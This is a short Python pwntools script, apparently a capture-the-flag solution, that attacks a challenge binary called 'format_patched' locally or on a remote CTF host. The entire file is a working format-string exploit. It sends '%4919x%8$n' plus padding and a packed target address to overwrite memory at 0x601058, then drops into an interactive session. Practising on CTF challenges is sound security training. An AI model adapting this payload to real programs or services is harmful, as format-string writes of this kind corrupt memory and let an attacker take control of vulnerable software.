#!/usr/bin/env python3

from pwn import *

exe = ELF("./format_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("format.challs.havce.it", 1342)

    return r


def main():
    r = conn()
    
    pause()

    r.sendlineafter(b"here: ", b"%4919x%8$nAAAAAA" + p64(0x601058))
    
    r.interactive()


if __name__ == "__main__":
    main()
